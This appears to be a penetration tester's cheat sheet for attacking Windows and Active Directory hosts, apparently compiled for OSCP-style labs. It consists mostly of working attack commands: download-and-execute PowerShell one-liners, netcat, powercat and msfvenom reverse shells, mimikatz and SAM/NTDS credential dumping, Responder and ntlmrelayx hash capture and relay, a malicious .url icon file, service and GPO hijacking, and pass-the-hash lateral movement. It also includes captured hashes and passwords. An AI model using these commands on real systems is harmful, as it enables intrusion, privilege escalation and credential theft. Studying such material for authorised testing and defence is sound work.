cmd.exe:

```shell
# certutil download with NT SYSTEM
certutil -urlcache -split -f http://192.168.45.155/windowsprivesc/reverse.exe reverse.exe

# Download using expand
expand http://192.168.45.230/windowsprivesc/ test.text
# Download from SBM share into Alternate Data Stream
expand \\badguy\evil.exe C:\Users\Public\somefile.txt:evil_ads.exe

#32 or 64 bits
wmic os get osarchitecture

#net version 
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP"

#osinfo
systeminfo

#fix the PATH to execute commands
set PATH=%SystemRoot%\system32;%SystemRoot%;

```

PowerShell:

```powershell

####################################
########### DOWNLOADS ##############
####################################

#download a file and run it instantly
IEX(IWR http://192.168.45.193/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell

#get all content from iwr request
Invoke-WebRequest -UseDefaultCredentials -Uri http://web04 | Select-Object -Expand content

# uploading a file:
(New-Object System.Net.WebClient).UploadFile('http://LISTEN_IP/upload.php','somefiile')

####################################
########### USERS ##################
####################################

# Run as a different user 
runas /user:username cmd

# powershell way change password with generic all
Set-ADAccountPassword -Identity someuser -OldPassword (ConvertTo-SecureString -AsPlainText "p@ssw0rd" -Force) -NewPassword (ConvertTo-SecureString -AsPlainText "qwert@12345" -Force)

# check account policy's password lockout threshold
net accounts

#Add to a group
net group "Management Department" stephanie /add /domain

#find all service users
Get-WmiObject -Query "SELECT * FROM Win32_Service" | ForEach-Object { $_.StartName }

#elevate to system
psexec -i -s cmd.exe

####################################
############## OS ##################
####################################

#enable scripts with psremote
Set-ExecutionPolicy RemoteSigned

# determine if OS is 64-bit (various methods)
[System.Environment]::Is64BitOperatingSystem
(Get-WMIObject Win32_OperatingSystem).OSArchitecture

#Get operating system info
Get-WmiObject Win32_OperatingSystem | Select-Object Caption, Version, BuildNumber, ServicePackMajorVersion, Manufacturer
Get-ComputerInfo | Select-Object OsName, OsVersion, OsBuildNumber, OsServicePack

#GET NET class version
$PSVersionTable.CLRVersion

####################################
########### PROCESSES ##############
####################################

#Get process ID of process
Get-Process NonStandardProcess | %{$_.name; $_.ID}

#find path of process ID
Get-Process -Id 8036 -FileVersionInfo | Select FileName

#find if ssh exists
if (Test-Path (Get-Command ssh.exe -ErrorAction SilentlyContinue).Source) { Write-Host "ssh.exe exists." } else { Write-Host "ssh.exe does not exist." }

#find if service exists
Get-Service -Name "AdminTool" -ErrorAction SilentlyContinue

#find if service restartable 
(Get-Service -Name "auditTracker").StartType -eq "Automatic"

####################################
########### NETWORK ################
####################################

#find if a port is listening
netstat -anp TCP | find "2222"
netsh interface portproxy show all

```

## SMB Share

```shell
#xfreerdp
freerdp +clipboard /u:offsec /p:'Th3R@tC@tch3r' /dynamic-resolution /cert-ignore /drive:test,/home/kali/offsec/upload /v:192.168.191.250 

#start smb server, connect with \\ip\smbfolder
impacket-smbserver smbfolder $(pwd) -smb2support -username test -password test

#mount the drive in powershell 
$pass = ConvertTo-SecureString 'test' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('test', $pass)

New-PSdrive -Name kali -PSProvider FileSystem -Credential $cred -Root \\192.168.49.106\smbfolder

#Transfer the file
# Windows to Kali
copy C:\Users\jim\Documents\Database.kdbx \\192.168.45.230\smbfolder\ 
#Kali to Windows
copy \\192.168.45.193\smbfolder\seatbelt.exe C:\temp\
```

## SSH transfers

```ssh

scp ariah@192.168.x.x:C:/ftp/Infrastructure.pdf . 

scp administrator@192.168.190.141:C:/users/public/oscp.exam_ . 

```
## Reverse Shells

**Con Pty shell**

```shell
#server
stty raw -echo; (stty size; cat) | rlwrap nc -lvnp 22

#reset it after
stty sane

#client

powershell IEX(IWR http://192.168.45.185/windowsprivesc/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.49.106 22

```

**Powercat**

```powershell
powershell Invoke-WebRequest -Uri 192.168.49.106/windowsprivesc/powercat.ps1 -OutFile powercat.ps1

powershell IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.49.106/windowsprivesc/powercat.ps1");powercat -c 192.168.49.106 -p 22 -e powershell

.\powercat.ps1 powercat -c 192.168.49.106 -p 22 -e powershell

```

**Netcat**

```shell
Invoke-WebRequest -Uri 192.168.49.106/windowsprivesc/nc.exe -OutFile nc.exe 

.\nc.exe -t -e C:\Windows\System32\cmd.exe 192.168.49.106 445

```

**base64**

If you convert to base64 on Linux for execution with `powershell -enc "BASE64ENCODEDCMD"`, use the following command to ensure you don't mess up the UTF-16LE encoding that Windows uses:

```sh
# base64-encoding custom powershell 1-liner
echo 'IEX(IWR http://192.168.45.230/windowsprivesc/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.45.230 3001' | iconv -t UTF-16LE | base64 | tr -d '\n'; echo

# msfvenom version
msfvenom -p cmd/windows/powershell_reverse_tcp -f raw lport=445 lhost=tun0 | iconv -t UTF-16LE | base64 | tr -d '\n'; echo
```

# Priv ESC

### Automated


``` shell
#for color 
REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1

#privescheck~~~~~~
Invoke-WebRequest -Uri 192.168.49.106/windowsprivesc/PrivescCheck.ps1 -OutFile PrivescCheck.ps1
~~
certutil -urlcache -split -f http://192.168.49.106/windowsprivesc/PrivescCheck.ps1 privesccheck2.ps1
~~
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck" -Report PrivescCheck -Format TXT
https://github.com/itm4n/PrivescCheck

#JAWS~~~~
Invoke-WebRequest -Uri 192.168.49.106/windowsprivesc/jaws-enum.ps1 -OutFile jaws-enum.ps1

powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1

#winpeas~~~~

Invoke-WebRequest -Uri 192.168.49.106/windowsprivesc/winPEASx64.exe -OutFile winpeas.exe
certutil -urlcache -split -f http://192.168.45.230/windowsprivesc/winPEASx64.exe winpeas.exe
~~~
.\winpeas.exe -ErrorAction SilentlyContinue

```

 Using Powersploit

```powershell
smbshare..

C:\Windows\system32\WindowsPowerShell\v1.0\Modules\ 
Copy-Item -Path "powersploit" -Destination "C:\Windows\system32\WindowsPowerShell\v1.0\Modules\" -Recurse
Import-Module .\powersploit
Import-Module C:\Windows\system32\WindowsPowerShell\v1.0\Modules\powersploit\PowerSploit.psd1

Get-UnattendedInstallFile
Get-Webconfig
Get-ApplicationHost

```

### Scheduled Tasks 

```powershell
#See a list of scheduled task look for the next and last run time + then run as user and task to run
schtasks /query /fo LIST /v 

#create a sched task
schtasks /create /tn "reverse" /sc minute /mo 1 /tr "C:\Users\adrian\reverse.exe"

.\godpotato.exe -cmd 'schtasks /create /tn "reverse" /sc minute /mo 1 /tr "C:\Users\adrian\reverse.exe" /ru "SID S-1-5-21-464543310-226837244-3834982083-500"'

#looking for F or write permissions
icacls [task to run]
#then upload the executable that can add a user we can control
```

### Service Hijacking

```powershell
# List of services with binary path
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

#permissions of path
icacls "C:\xampp\mysql\bin\mysqld.exe"

#rplacing the binary
move C:\xampp\mysql\bin\mysqld.exe mysqld.exe
move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe

net stop ServiceName
net start ServiceName

#find if service restartable 
(Get-Service -Name "auditTracker").StartType -eq "Automatic"

#if not restartable
shutdown /r /t 0

#automate with powerup, but best to manually review the service ourself with icalcs
powershell -ep bypass
. .\PowerUp.ps1
Get-ModifiableServiceFile
Install-ServiceBinary -Name 'mysql'

```

### Unquoted service paths

```
C:\Program Files\My Program\My service\service.exe

C:\Program.exe
C:\Program Files\My.exe
C:\Program Files\My Program\My.exe



```

```powershell
#list of services with binary path
Get-CimInstance -ClassName win32_service | Select Name,State,PathName

C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
icacls "C:\"
icacls "C:\Program Files"
..

copy .\Current.exe 'C:\Program Files\Enterprise Apps\Current.exe'

Start-Service  GammaService

#powerup
. .\PowerUp.ps1
Get-UnquotedService
```

## Service DLL Hijack

First, identify why the service does not work by transferring it to windows and using procmon. 

```powershell

sc.exe create "scheduler" binpath= "C:\Users\offsec\Desktop\scheduler.exe"

restart-service scheduler

##PROCMON CTL + L for filter path dll and "FOUND"

#create the dll and place in folder
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.230 LPORT=3000 -f dll -o beyondhelper.dll


```

## GPO

We can check what permissions we have on a specific GPO by passing its GUID (labeled "name") to the cmdlet `Get-GPPermission`. Let's check our permissions on the **Default Group Policy**.

```
*Evil-WinRM* PS C:\Users\anirudh\Documents> Get-GPPermission -Guid 31B2F340-016D-11D2-945F-00C04FB984F9 -TargetType User -TargetName anirudh


Trustee     : anirudh
TrusteeType : User
Permission  : GpoEditDeleteModifySecurity
Inherited   : False
```

The entry labeled `Permission` shows that we have the ability to edit, delete, and modify this policy. We can take advantage of this misconfiguration by using a tool named `SharpGPOAbuse`.

GPO Abuse via SharpGPOAbuse

Let's download a copy of the pre-complied executable from https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.0_x64/SharpGPOAbuse.exe to our Kali host.

```
┌──(kali㉿kali)-[~]
└─$ wget https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.0_x64/SharpGPOAbuse.exe
--2021-11-19 15:27:15--  https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.0_x64/SharpGPOAbuse.exe
...

2021-11-19 15:27:16 (3.70 MB/s) - ‘SharpGPOAbuse.exe’ saved [70656/70656]
```

Back in our `evil-winrm` shell, we'll upload the executable using the `upload` command.

```
*Evil-WinRM* PS C:\Users\anirudh\Documents> upload /home/kali/SharpGPOAbuse.exe
Info: Uploading /home/kali/SharpGPOAbuse.exe to C:\Users\anirudh\Documents\SharpGPOAbuse.exe

                                                             
Data: 94208 bytes of 94208 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\Users\anirudh\Documents> 
```

We can now execute **SharpGPOAbuse.exe** specifying that we want to add our user account to the local Administrators group, passing our username, and passing the group policy we have write access to.

```
*Evil-WinRM* PS C:\Users\anirudh\Documents> ./SharpGPOAbuse.exe --AddLocalAdmin --UserAccount anirudh --GPOName "Default Domain Policy"
[+] Domain = vault.offsec
[+] Domain Controller = DC.vault.offsec
[+] Distinguished Name = CN=Policies,CN=System,DC=vault,DC=offsec
[+] SID Value of anirudh = S-1-5-21-537427935-490066102-1511301751-1103
[+] GUID of "Default Domain Policy" is: {31B2F340-016D-11D2-945F-00C04FB984F9}
[+] File exists: \\vault.offsec\SysVol\vault.offsec\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
[+] The GPO does not specify any group memberships.
[+] versionNumber attribute changed successfully
[+] The version number in GPT.ini was increased successfully.
[+] The GPO was modified to include a new local admin. Wait for the GPO refresh cycle.
[+] Done!
*Evil-WinRM* PS C:\Users\anirudh\Documents> 
```

With that done, we'll need to update the local Group Policy.

```
*Evil-WinRM* PS C:\Users\anirudh\Documents> gpupdate /force
Updating policy...



Computer Policy update has completed successfully.

User Policy update has completed successfully.
```

We can verify that this worked by checking the members of the local Administrators group.
# Scanning New Network 

Once we have discovered a new network and internal machine:

```shell

#Check which computers we have access to 
crackmapexec smb 172.16.238.0/24 -u joe -p Flowers1 --continue-on-success 
crackmapexec smb 172.16.237.83 -u support -H 00000000000000000000000000000000:d9358122015c5b159574a88b3c0d2071 --local-auth

crackmapexec winrm 10.10.99.0/24 -u  celia.almeda -H aad3b435b51404eeaad3b435b51404ee:e728ecbadfb02f51ce8eed753f3ff3fd

#aseproast for quick hashes 
impacket-GetNPUsers -dc-ip 172.16.93.6  -request -outputfile hashes.asreproast oscp.exam/jim

```

# Windows Passwords & Hashes

##  Windows Passwords in Files

To decrypt the Groups.xml password: `gpp-decrypt encryptedpassword`

```powershell

#mimikittenz
Invoke-WebRequest -Uri 192.168.49.106/windowsprivesc/Invoke-mimikittenz.ps1 -OutFile Invoke-mimikittenz.ps1
import-module .\Invoke-mimikittenz.ps1
Invoke-Mimikittenz

#seatbelt
Invoke-WebRequest -Uri 192.168.49.106/windowsprivesc/Seatbelt.exe -OutFile seatbelt.exe
.\seatbelt.exe -group=user

# anything in env?
Get-ChildItem Env:

#get history 
type (Get-PSReadlineOption).HistorySavePath

ls C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

#find file 
Get-ChildItem -Path C:\ -Include local.txt -File -Recurse -ErrorAction SilentlyContinue
dir C:\Users\local.txt /s /b

# User files that may have juicy data
powershell -c "Get-ChildItem -Path C:\Users\ -Exclude Desktop.ini -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.gpg,*.kdbx,*.ini,*.pst,*.ost,*.eml,*.msg,*.log,id_* -File -Recurse -ErrorAction SilentlyContinue"

# files with juicy info
dir /a-d /s/b C:\users | findstr /ilvC:\AppData\ /C:\desktop.ini /C:\ntuser.dat /C:"\All Users\VMware" /C:"\All Users\USOShared" /C:"\All Users\Package" /C:"\All Users\Microsoft"

# FileZilla config:
# look for admin creds in FileZilla Server.xml
dir /s/b C:\FileZilla*.xml
type "FileZilla Server.xml" | findstr /spin /c:admin
type "FileZilla Server Interface.xml" | findstr /spin /c:admin

# Unattend install files: plaintext or base64 encoded password
cat C:\unattend.xml
cat C:\Windows\Panther\Unattend.xml
cat C:\Windows\Panther\Unattend\Unattend.xml
cat C:\Windows\system32\sysprep.inf
cat C:\Windows\system32\sysprep\sysprep.xml

# IIS, web.config can contain admin creds
cat C:\inetpub\wwwroot\web.config
cat C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config

# SNMP credentials
reg query HKLM\SYSTEM\Current\ControlSet\Services\SNMP

# Putty proxy creds
reg query HKCU\Software\SimonTatham\PuTTY\Sessions

# Search registry for password
reg query HKCU /f password /t REG_SZ /s

#powersploit
Get-UnattendedInstallFile
Get-Webconfig
Get-ApplicationHost

```

## SAM Database 

```shell

#Look for SAM and SYSTEM files in windows.old or windows -  system 32
powershell -c "Get-ChildItem -Path C:\ -Exclude Desktop.ini -Include SAM -File -Recurse -ErrorAction SilentlyContinue"

reg save hklm\system system
reg save hklm\sam sam

#crack it
samdump2 system sam
#if the hashes are null password
impacket-secretsdump -sam SAM -system SYSTEM LOCAL 

```
## Hashes and Passwords Using Crackmapexec

Probably the easiest way to grab all the hashes from a box once you have admin creds or an admin hash:

```sh
# dump SAM (using PtH)
crackmapexec smb VICTIM -u Administrator -H NTHASH --local-auth --sam

# dump LSA
crackmapexec smb VICTIM -u Administrator -p PASSWORD --local-auth --lsa

# dump NTDS.dit
crackmapexec smb VICTIM_DC -u DOMAIN_ADMIN -H NTHASH --ntds
```

##  Grab NTLMv2 Hashes Using Responder

Note: In addition to SMB, [Responder](https://github.com/lgandx/Responder) also includes other protocol servers (including HTTP and FTP) as well as poisoning capabilities for Link-Local Multicast Name Resolution (LLMNR), NetBIOS Name Service (NBT-NS), and Multicast DNS (MDNS).

```sh
# start Responder
# if your victim is Windows XP/Server 2003 or earlier, add '--lm' flag
sudo responder -I tun0
# verify it shows:
# SMB server    [ON]
```

Once you have Responder's SMB server listening, you can force your victim to authenticate to you in several ways:

- With remote code execution, run `net use \\ATTACKER_IP\derp` or (PowerShell) `ls \\ATTACKER_IP\derp`.
- With ability to upload files to victim web server, **enter a non-existing file with a UNC path** like `\\ATTACKER_IP\derp\nonexistent.txt`
	- To do this, capture a normal upload with Burp, then change the "filename" field to have a UNC path. **Use double-backslashes!!** (i.e. `filename="\\\\192.168.45.192\\derp\\secrets.txt"`)
	- Here's how to do it with curl:

```sh
# Malicious file upload to non-existent UNC path, triggering NTLMv2 auth with Responder
# Change 'myFile' to the file's form-field name.
# The '@-' tells curl to take the file content from stdin,
# which is just the 'echo derp' output.
# Adding the ';filename=' coerces curl to set your custom filename in the form post
# Remember, you must use double-backslashes to escape them properly!!!
# '-x' arg passes your curl payload to Burp proxy for inspection
echo derp | curl -s -x "http://127.0.0.1:8080" -F 'myFile=@-;filename=\\\\ATTACKER_IP\\derp\\derp.txt' "http://VICTIM_IP/upload" 
```

After the victim tries to authenticate to the Responder SMB server, you should see it display the NTLMv2 hash that it captured during the handshake process:

```
...
[+] Listening for events... 
[SMB] NTLMv2-SSP Client   : ::ffff:192.168.50.211
[SMB] NTLMv2-SSP Username : FILES01\paul
[SMB] NTLMv2-SSP Hash     : paul::FILES01:1f9d4c51f6e74653:795F138EC69C274D0FD53BB32908A72B:010100000000000000B050CD1777D801B7585DF5719ACFBA0000000002000800360057004D00520001001E00570049004E002D00340044004E004800550058004300340054004900430004003400570049004E002D00340044004E00480055005800430034005400490043002E00360057004D0052002E004C004F00430041004C0003001400360057004D0052002E004C004F00430041004C0005001400360057004D0052002E004C004F00430041004C000700080000B050CD1777D801060004000200000008003000300000000000000000000000002000008BA7AF42BFD51D70090007951B57CB2F5546F7B599BC577CCD13187CFC5EF4790A001000000000000000000000000000000000000900240063006900660073002F003100390032002E003100360038002E003100310038002E0032000000000000000000 
```

Copy the hash and save it to a file. Then crack it with hydra/john:

```sh
hashcat -m 5600 responder.hash /usr/share/wordlists/rockyou.txt --force
```

When you can't crack an NTLMv2 hash that you were able to capture with Responder, you can relay it to another machine for access/RCE (assuming it's an admin hash, and Remote UAC restrictions are disabled on the target). If this works, you get instant SYSTEM on the remote machine.

```sh
# '-c' flag is command to run
# here we are generating a powershell reverse shell one-liner
# as base64-encoded command
sudo impacket-ntlmrelayx -t VICTIM_IP --no-http-server -smb2support -c "powershell -enc $(msfvenom -p cmd/windows/powershell_reverse_tcp -f raw lport=443 lhost=tun0 | iconv -t UTF-16LE | base64 | tr -d '\n')"

# start a netcat listener to catch the reverse shell
sudo nc -nvlp 443
```

### URI File Attack

As this is a Windows host, we can use the SMB share access to upload a file that the target system will interpret as a Windows shortcut. In this file, we can specify an icon that points to our Kali host. This should allow us to capture the user's NTLM hash when it is accessed.

We'll create a file named **@hax.url** with the following contents.

```
┌──(kali㉿kali)-[~]
└─$ cat @hax.url 
[InternetShortcut]
URL=anything
WorkingDirectory=anything
IconFile=\\192.168.118.14\%USERNAME%.icon
IconIndex=1
```

When a user accesses this file, it will attempt to load the icon. This will cause a request to our Kali host for a file named with the user account's username. This request should also contain the NTLM hash of this account.

Before uploading the file to the SMB share, let's start `responder` to listen for the request.

```
┌──(kali㉿kali)-[~]
└─$ sudo responder -I tap0 -v
...
[+] Listening for events...
...
```

Next, let's upload our file.

```
...
smb: \> put @hax.url 
putting file @hax.url as \@hax.url (1.2 kb/s) (average 1.2 kb/s)
smb: \> quit

┌──(kali㉿kali)-[~]
└─$
```

After a little while, `responder` captures a hash.

```
...
[SMB] NTLMv2-SSP Client   : 192.168.120.116
[SMB] NTLMv2-SSP Username : VAULT\anirudh
[SMB] NTLMv2-SSP Hash     : anirudh::VAULT:9def1316e1c05550:0AF01C475AFD7AD30D439711296603FC:010100000000000000C8C8F445DDD70175319E0B50E5D26C0000000002000800410031005900380001001E00570049004E002D004C00580033003800430030004B004C00350047005A0004003400570049004E002D004C00580033003800430030004B004C00350047005A002E0041003100590038002E004C004F00430041004C000300140041003100590038002E004C004F00430041004C000500140041003100590038002E004C004F00430041004C000700080000C8C8F445DDD7010600040002000000080030003000000000000000010000000020000024B3687DE76994B1C5B750504A62A0055473E634299355A166AE72D58CD7F8660A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E003100310038002E00310034000000000000000000 
```

Nice, we successfully obtained the NTLM hash for a user named `anirudh`.
## Mimikatz


```powershell

Invoke-WebRequest -Uri 192.168.45.230/windowsprivesc/mimikatz.exe -OutFile mimikatz.exe
certutil -urlcache -split -f http://192.168.49.106/windowsprivesc/mimikatz.exe mimikatz.exe

.\mimikatz.exe
# start logging session to file
log \\ATTACKER_IP\share\mimikatz.log
# enable full debug privileges to have access to system memory
privilege::debug
# elevate to system
token::elevate
# get hashes and try to print plaintext passwords
sekurlsa::logonpasswords
# dump hashes from SAM
lsadump::sam
# list all available kerberos tickets
sekurlsa::tickets
# List Current User's kerberos tickets
kerberos::list
# tries to extract plaintext passwords from lsass memory
sekurlsa::wdigest
# Get just the krbtgt kerberos tikcket
sekurlsa::krbtgt

# get google chrome saved credentials
dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data" /unprotect
dpapi::chrome /in:"c:\users\administrator\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
```

If **LSA Protection** is enabled (default starting with Windows 8.1), this hampers your ability to collect hashes without first bypassing it.

```powershell
# check if LSA Protection enabled (key set to 1 or 2)
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL
```

----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

AS_REQ During initial authentication (logging into workstation) DC  acting as KDC, receives the AS-REQ with a timestamp, encrypted from the password of the user and the username.  
  
AD receives the request, verifies the password hash (in ntds.dit) and decrypt the timestamp, then it is succesfull.  
  
AD responds with an AS-REP, this contains the session key and a ticket granting ticket, the session key is encrypted with the users password hash and can be decrypted by the user (or any app that has the password hash of the user), the Ticket granting ticket contains info about the user, domain, timestamp, ip address, and session key. It is actually encrypted with the NTLM hash of the krbtgt account only known to the KDC and cannot be decrypted.  
  
After AS-REQ and AS-REP the client is authenticated. And TGT is valid for ten hours.  
  
Now the user want to access a network share, it contacts the TGT with a TGS-REQ, this contains the user, timestamp encrypted with the session key, name of the resource and encrypted TGT.  
  
The KDC receives the TGS-REQ and the TGT is decrypted using the password of the krbtgt account (NTLM HASH), the session key is extracted from the TGT and used to decypt the username and timestamp, this it performs checks for a valid timestamp, the username , and the IP address.  
  
After a succesfull TGS-REQ the KDC will provide a TGS-REP which include, the name of the service, the session key, and a service ticket that contains the username and group membership and session key. The service tickets service name and session key are encrypted using the session key associated with the creation of the TGT.  The service ticket is encrypted with the password hash of the service account registered with the service in question.  
  
Now armed with the session key and service ticket provided by the TGS-REP authentication begins with the service  
  
The client sends the application server an AP-REQ, this includes the username, timestamp encrypted with the session key associated with the service ticket along with the service ticket. The application server decrypts the service ticket using the service account password hash and extracts the username and session key. It then decypts the username from the AP-REQ and permissions must match - then the user is allowed to access the service.


# Active Directory Enumeration

### Simple Script

When you start your internal pentest, these are the first modules you should try:

```sh
# Zerologon
crackmapexec smb DC_IP -u '' -p '' -M zerologon

# PetitPotam
crackmapexec smb DC_IP -u '' -p '' -M petitpotam

# NoPAC (requires credentials)
crackmapexec smb DC_IP -u 'user' -p 'pass' -M nopac

# LAPS 
crackmapexec ldap 192.168.219.122 -u fmcsorley -p CrabSharkJellyfish192 --kdcHost 192.168.219.122 -M laps


```


This script will provide a quick listing of all computers, users, service
accounts, groups and memberships on an Active Directory domain.

This script was adapted from one written by Cones, who modified the example code provided in the PWK course materials.

```powershell
$pdc=[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner;
$dn=([adsi]'').distinguishedName
$p=("LDAP://"+$pdc.Name+"/"+$dn);
$d=New-Object System.DirectoryServices.DirectoryEntry($p)
$s=New-Object System.DirectoryServices.DirectorySearcher($d)
write-host "==========    PRIMARY DC    ==========";
$pdc|select Name,IPAddress,OSVersion,SiteName,Domain,Forest|format-list
write-host "==========    COMPUTERS    ==========";
$s.filter="(objectCategory=computer)";$s.FindAll()|?{write-host $_.Path};
write-host "==========    USERS    ==========";
$s.filter="(objectCategory=person)";$s.FindAll()|?{write-host $_.Path};
write-host "==========    SERVICES    ==========";
$s.filter="(serviceprincipalname=*)";$s.FindAll()|?{write-host $_.Path};
write-host "==========    GROUPS    ==========";
$s.filter="(objectCategory=group)";$s.FindAll()|?{write-host $_.Path};
write-host "==========    MEMBERSHIP    ==========";
function _r {
  param($o,$m);
  if ($o.Properties.member -ne $null) {
    $lm=[System.Collections.ArrayList]@();
    $o.Properties.member|?{$lm.add($_.split(",")[0].replace("CN=",""))};
    $lm=$lm|select -unique;
    $m.add((New-Object psobject -Property @{
      OU = $o.Properties.name[0]
      M = [string]::Join(", ",$lm)
    }));
    $lm | ?{
      $s.filter=[string]::Format("(name={0})",$_);
      $s.FindAll()|?{_r $_ $m | out-null};
    }
  }
}
$m=[System.Collections.ArrayList]@();
$s.FindAll()|?{_r $_ $m | out-null};
$m|sort-object OU -unique|?{write-host ([string]::Format("[OU] {0}: {1}",$_.OU,$_.M))};
```

Here's a quick script to list the local administrators of all hosts in a domain:

```powershell
$LocalGroup = 'Administrators'
$pdc=[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner;
$dn=([adsi]'').distinguishedName
$p=("LDAP://"+$pdc.Name+"/"+$dn);
$d=New-Object System.DirectoryServices.DirectoryEntry($p)
$s=New-Object System.DirectoryServices.DirectorySearcher($d)
$s.filter="(objectCategory=computer)"
$computers=$s.FindAll()|%{$_.Properties.cn}
foreach ($c in $computers) {
  echo "`r`n==========   $c   =========="
  try {
    $grp=[ADSI]("WinNT://$c/$LocalGroup,Group")
    $mbrs=$grp.PSBase.Invoke('Members')
    $mbrs|%{$_.GetType().InvokeMember('Name','GetProperty',$null,$_,$null)}
  } catch {
    echo "[x] ERROR retrieving group members"
    continue
  }
}
```

###  PowerView

Usage (some commands may take a minute or two to complete):

```powershell
#download
certutil -urlcache -split -f http://192.168.45.230/windowsprivesc/PowerView.ps1 powerview.ps1

# list of all usernames with last logon and password set times
Get-NetUser | select samaccountname,pwdlastset,lastlogon, objectsid

# list of all service accounts, or Service Principal Names (SPNs)
Get-NetUser -SPN | select samaccountname,serviceprincipalname

# convert SID to name (useful for translating Get-ObjectAcl output)
Convert-SidToName SID

# list of all group names
Get-NetGroup | select samaccountname,description

# all members of specific group
Get-DomainGroupMember "Domain Admins" | select membername

# list all computers
Get-DomainComputer | select dnshostname,operatingsystem,operatingsystemversion
# get all IP addresses and hostnames
resolve-ipaddress @(Get-DomainComputer|%{$_.dnshostname})

# finds machines on the local domain where the current user has local administrator access
Find-LocalAdminAccess

Find-DomainShare -CheckShareAccess|fl # only list those we can access
# finds domain machines where specific users are logged into

# finds domain machines where specific processes are currently running
Find-DomainProcess


```

**Convert SID to name.**
```shell
# Import the .NET assembly for SecurityIdentifier

Add-Type -AssemblyName System.DirectoryServices.AccountManagement

# Get the SecurityIdentifier and ActiveDirectoryRights

$acl = Get-ObjectAcl -Identity "Management Department" | Where-Object {$_.ActiveDirectoryRights -eq "GenericAll"} | Select-Object SecurityIdentifier, ActiveDirectoryRights

# Convert SecurityIdentifier to name using the Translate method

$acl | ForEach-Object {

    $sid = $_.SecurityIdentifier

    $translatedName = (New-Object System.Security.Principal.SecurityIdentifier($sid)).Translate([System.Security.Principal.NTAccount]).Value

    # Output the translated name along with other properties

    $_ | Add-Member -MemberType NoteProperty -Name "TranslatedName" -Value $translatedName -Force

    $_

}
```

**Find all accesses my SID has to GenericAll for every object**
```shell
Get-DomainObjectAcl -Domain medtech.com | ? { $_.ActiveDirectoryRights -match "GenericAll" -and $_.SecurityIdentifier -match "S-1-5-21-2610934713-1581164095-2706428072-1105" }

#list all of the below rights
$desiredRights = "GenericAll","GenericWrite","WriteOwner","WriteDACL","AllExtendedRights","ForceChangePassword","Self"
Get-DomainObjectAcl -Domain medtech.com | Where-Object { $_.ActiveDirectoryRights -in $desiredRights -and $_.SecurityIdentifier -match "S-1-5-21-976142013-3766213998-138799841-1110" }

```

### ADpeas

```shell
certutil -urlcache -split -f http://192.168.49.106/windowsprivesc/adPEAS.ps1 adpeas.ps1

. .\adpeas.ps1
Invoke-adPEAS

```

### BloodHound

On the attacker machine:

```sh
# start the neo4j server
sudo neo4j start

# browse to neo4j webUI to configure a password
firefox http://localhost:7474
# log in with neo4j:neo4j
# and change password to whatever you want (remember for later!)

# now that neo4j is running, start bloodhound
bloodhound
# configure it to log into local neo4j server using approriate URL and creds
# URL: bolt://localhost:7687
```


```
MATCH (m:Computer) RETURN m
MATCH (m:User) RETURN m

MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p

```

Or use bloodhound custom queries here: [Bloodhound-Custom-Queries/customqueries.json at master · hausec/Bloodhound-Custom-Queries](https://github.com/hausec/Bloodhound-Custom-Queries/blob/master/customqueries.json) 
# Lateral Movement in Active Directory

### PsExec on Active Directory

PsExec allows you to run remote processes as a child of a Windows service process, meaning you get SYSTEM privileges.

**Prerequisites: The user that authenticates to the target machine needs to be part of the *Administrators* local group. In addition, the _ADMIN$_ share must be available and File and Printer Sharing must be turned on (this is default).**

Using `impacket-psexec` from Kali, pass-the-hash is possible:

```sh
#pass the ntlm hash to get a remote shell (believe it needs to be admin) possibly put domain/joe if does not work 
impacket-psexec -hashes 00000000000000000000000000000000:8b4547a5116dd13e6e206d1286a06b28 Administrator@10.10.80.142

# with password authentication:
impacket-psexec 'oscp.exam/Administrator:vau!XCKjNQBv2$@172.16.93.21'
```

Using Sysinternals PsExec for remote interactive session (from windows host):

```powershell
# interactive shell using sysinternals version of psexec
./PsExec64.exe -accepteula -i  \\VICTIM -u DOMAIN\ADMINUSER -p PASSWORD cmd
```

### WMI (135) and WinRM  (5985) on Active Directory

*Windows Management Instrumentation (WMI)* is capable of creating processes via the `Create` method from the `Win32_Process` class. It communicates through *Remote Procedure Calls (RPC)* 
In order to create a process on the remote target via WMI, we need credentials of a member of the _Administrators_ local group, which can also be a domain user

```sh
# spawns remote shell as admin user with pass-the-hash
impacket-wmiexec -hashes :NTHASH ADMINUSER@VICTIM_IP

# Run remote command as Administrator; same syntax as psexec
impacket-wmiexec -hashes 00000000000000000000000000000000:08d7a47a6f9f66b97b1bae4178747494 medtech/joe@172.16.238.11

# using password authentication
